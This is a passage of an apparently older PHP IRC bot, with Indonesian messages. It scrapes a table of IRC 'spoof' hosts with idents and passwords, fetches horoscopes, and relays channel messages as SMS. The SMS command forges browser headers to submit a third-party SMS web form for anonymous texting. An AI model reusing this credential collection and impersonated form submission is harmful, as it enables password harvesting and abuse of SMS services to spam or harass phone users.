									$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
									$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
									$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
									$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
									$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
									$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
									$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
									$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
									$isisp[$i]["$spoof"]['ident']=$identsp;
									$isisp[$i]["$spoof"]['spoof']=$spoofsp;
									$isisp[$i]["$spoof"]['pass']=$passsp;
									}
									else{
									$identsp="";$spoofsp="";$passsp="";
									$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
									$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
									$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
									$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
									$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
									$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
									$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
									$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
									$isisp[$i]["$spoof"]['ident']=$identsp;
									$isisp[$i]["$spoof"]['spoof']=$spoofsp;
									$isisp[$i]["$spoof"]['pass']=$passsp;
									}
								}
									$jmlspoof["$spoof"]=$tmpjml;
									fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Update Complete! FOUND :'.$tmpjml. ' Spoof'. CRLF);
							}
							elseif (ereg(':!astro',strtolower($Params[3])) && ereg('#',$Params[2]) && $sysastro=="on") {
							fputs($fp,'PING 3424234328'. CRLF);
							    $astro = strtolower($Params[4]);
							    if (in_array($astro, $zodiak)) {
								    $pages = "http://www.astaga.com/astrologi/?cat=$astro";
								    $handi = fopen ($pages, "rb");
								    $konten = "";
								    do {
									       $baris = fread($handi, 512);
								       if (strlen($baris) == 0) { break; }
									       $konten .= $baris;
							       } while(true);
								    fclose ($handi);
								$zod1 = stristr($konten,'<td id=ast><p>');
								$zod2 = stristr($zod1,'</table>');
								$bintang = str_replace($zod2,"",$zod1);
								$bintang = str_replace("\n","",$bintang);
								$bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
								$bintang = str_replace("</p>"," ",$bintang);
								$bintang = str_replace("<p><b>","",$bintang);
								$bintang = str_replace("</b>","",$bintang);
								$bintang = str_replace("</td>","",$bintang);
								$bintang = str_replace("<b>","",$bintang);
								$bintang = str_replace("</td>","",$bintang);
								$bintang = str_replace("</tr>","",$bintang);
								$bintang = str_replace("<tr>","",$bintang);
								$zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
								$bintang = str_replace($zod3,"",$bintang);
								fputs($fp,'PRIVMSG '.$Params[2].' :15(04Astro15) '.$bintang . ' (Astaga.com)'. CRLF);
							    }
							}
							elseif (strtolower($Params[3])==":!sms" && $Params[5] && ereg('#',$Params[2]) && $syssms=="on") {
								fputs($fp,'PING 3424234328'. CRLF); 
								$msgsms=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                                                $fpsms = fsockopen($smsx['host'], $smsx['port'], $errno, $errstr);
                                                                if($udahno!=$Params[4]){
									if (!$fpsms) {
									fputs($fp,'PRIVMSG ' . $Params[2] . ' :SMS dari [12' . $fsrc[nick] . '] 4Gagal Dikirim...' . CRLF);
									}
									else {
									fputs($fp,'PRIVMSG ' . $Params[2] . ' :7Harap Tunggu!! Sedang Mengirim Sms [12' . $fsrc[nick] . ']...' . CRLF);

                                                                        $lencharmsg = 120 - strlen($msgsms);
                                                                        $msgx['send']="recipient=" . $Params[4] . "&message=" . $msgsms . "&remainchars=" . $lencharmsg . "&Submit=Kirim";
                                                                        $msgx['len']=strlen($msgx['send']);
                                                                        
                                                                        $client['user-agent']="User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4)\r\n";
                                                                        $client['accept-language']="Accept-Language: en-us,en;q=0.5\r\n";
                                                                        $client['accept-encoding']="Accept -Encoding: gzip , deflate\r\n";
                                                                        $client['accept-charset']="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
                                                                        $client['referer']=$smsx['path'] . "\r\n";
                                                                        $client['content-type']="Content-Type: application/x-www-form-urlencoded\r\n";
                                                                        $client['content-lenght']="Content-Length: " . $msgx['len'] . "\r\n\r\n";
									$out ='POST ' . $smsx['path'] . " HTTP/1.1\r\n";
									$out .="HOST: " . $smsx['host'] . "\r\n";
									$out .=$client['user-agent'];
									$out .=$client['accept-language'];
									$out .=$client['accept-encoding'];
									$out .=$client['accept-charset'];
									$out .=$client['referer'];
									$out .=$client['content-type'];
									$out .=$client['content-lenght'];
									$out .=$msgx['send'] . "\r\n\r\n";
									echo $out;
									fwrite($fpsms, $out);
									while (!feof($fpsms)) {
									    $shoutcastpage .= fgets($fpsms, 8192);
									}
									fclose($fpsms);
									fputs($fp,'PRIVMSG ' . $Params[2] . ' :SMS dari [12' . $fsrc[nick] . '] 3Sukses Terkirim...' . CRLF);
									$udahno=$Params[4];

									}
                                                                }
                                                                else{
                                                                    fputs($fp,'PRIVMSG ' . $Params[2] . ' :Sms [12' . $fsrc[nick] . '] 4gagal di kirim. No.Hp tdk bleh berturut2 sama' . CRLF);
	                                                        }




							}
						}
						########## End Command Public ###############

					}

					################ END RAW ################
				}
				elseif ( substr($DataLine,0,4) == 'PING' ) {
	    				fputs($fp,'PONG ' . substr($DataLine,5) . CRLF);
  		    		}
				$response ="";
			}
		}
	fclose ($fp);
	unset ($fp);
	unset ($Header);
}

} while ($keluar==0);
############### END ###########